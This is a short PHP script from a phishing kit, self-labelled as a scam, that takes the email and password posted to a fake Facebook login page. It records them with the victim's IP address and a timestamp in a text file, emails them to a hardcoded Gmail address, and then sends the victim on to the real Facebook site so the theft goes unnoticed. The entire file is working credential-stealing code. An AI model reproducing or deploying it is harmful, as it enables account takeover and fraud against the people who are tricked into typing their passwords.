<?php

/**   Scam Made By Ashraf Elmalky 2020  **/


$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "xxxxxxxxxxxxxxxx+ YAMIX +xxxxxxxxxxxxxxxx\n";
$message .= "user: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['pass']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "ashrafelmalky555@gmail.com";
$subject = "FaceBook ReZulT | $ip";
$headers = "From: FaceBook ReZulT";
$file = fopen("RzLt.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: https://www.facebook.com");



?>